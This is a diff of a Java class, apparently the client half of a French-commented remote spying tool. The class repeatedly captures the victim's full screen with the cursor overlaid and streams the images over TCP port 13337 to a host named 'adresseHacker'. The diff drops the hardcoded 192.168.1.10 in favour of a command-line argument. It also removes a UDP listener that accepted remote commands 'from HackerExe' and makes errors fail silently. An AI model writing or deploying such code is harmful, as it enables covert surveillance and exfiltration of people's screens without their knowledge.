@@ -24,37 +24,27 @@ import javax.swing.ImageIcon;
 
 
 public class ClientExe {
-	private final String ressourcesDirectory = System.getProperty("user.dir") + "\\ressources\\";
+	private final static String ressourcesDirectory = System.getProperty("user.dir") + "\\ressources\\";
 
 	private int frameClientWidth; 
 	private int frameClientHeight;
 	
 	/* Réseau */
-	private static String adresseHacker = "192.168.1.10";
+	private static String adresseHacker;
 	private static final int portServeur = 13337;
 	private InetSocketAddress adrDest = new InetSocketAddress(adresseHacker, portServeur);
 	
-	private DatagramSocket listenTelecommandeSocket;
 	private static Socket socketClient;
 	
 	
 	
 	public static void main (String args[]) throws InterruptedException, IOException, AWTException {
-		if (args.length > 0) { System.out.println( args[0] ); setAdressehacker(args[0]);}
+		if (args.length > 0) { System.out.println( "Argument : " + args[0] ); setAdressehacker(args[0]);}
 		ClientExe c = new ClientExe();
 		c.init();
 		c.FullScreenCaptureResized(1280, 720);
-		c.listenTelecommande();
 	}
 	
-	
-	private void listenTelecommande() throws IOException {
-	
-		while (true) {
-			String receveidCmd = receiveFromHacker();
-			sendToTelecommande(receveidCmd);
-		}
-	}
 
 	
 	public void FullScreenCaptureResized(int width, int height) throws IOException, AWTException {
@@ -67,7 +57,7 @@ public class ClientExe {
 		   				Thread.sleep(100);
 			    	   	int mX = (int)MouseInfo.getPointerInfo().getLocation().getX();
 			    	   	int mY = (int)MouseInfo.getPointerInfo().getLocation().getY();
-						
+			    	   	
 			            /* Prends une screen et rajoute l'image du curseur par dessus */
 			            Rectangle screenRec = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());  
 			            BufferedImage bi = new Robot().createScreenCapture(screenRec);
@@ -77,7 +67,6 @@ public class ClientExe {
 			            /* On resize l'image */
 			            ImageIcon nativeScreen = new ImageIcon(bi);
 			            java.awt.Image imgResized = nativeScreen.getImage().getScaledInstance(width, height, java.awt.Image.SCALE_SMOOTH);
-			            
 			            BufferedImage BUFF = new BufferedImage(imgResized.getWidth(null), imgResized.getHeight(null), BufferedImage.TYPE_INT_ARGB);
 		
 			            /* On "dessine" l'image sur le Graphics2D */
@@ -86,18 +75,17 @@ public class ClientExe {
 			            bGr.dispose();
 		
 			            
-			            
 			            /* On copie l'image dans un tableau de byte[] */
 			            ByteArrayOutputStream baos = new ByteArrayOutputStream();
 			            ImageIO.write(BUFF, "gif", baos);
-			            
+			    //System.out.println("-85-");
 			            /* On envoit ScreenSize= pour spécifier au serveur qu'on va lui envoyer une screenshot */
 			            envoyer("ScreenSize=" + baos.size());
 			            envoyer( baos.toByteArray() );
 			            baos.close();
 		    	   }
 		       }
-		       catch (AWTException | IOException | InterruptedException ex) {System.err.println(ex);}
+		       catch (AWTException | IOException | InterruptedException ex) { ex.getStackTrace();}
 		     }
 		}).start();
 		/***********************************************************************/
@@ -119,9 +107,6 @@ public class ClientExe {
 	private void initSocket() throws IOException {
 		socketClient = new Socket();
 		socketClient.connect(adrDest);
-		
-		listenTelecommandeSocket = new DatagramSocket(null);
-		listenTelecommandeSocket.bind(new InetSocketAddress(54322));
 	}
 	
 	
@@ -153,16 +138,6 @@ public class ClientExe {
 		return;
 	}
 
-	
-	/*
-	 * Listen on UDP port 54322 for some remote commands from HackerExe 
-	 */
-	private String receiveFromHacker() throws IOException{
-		byte[] bufR = new byte[2048];
-		DatagramPacket dpR = new DatagramPacket(bufR, bufR.length);		
-		listenTelecommandeSocket.receive(dpR);
-		return new String(bufR, dpR.getOffset(), dpR.getLength());
-	}
 	
 	
 	/*
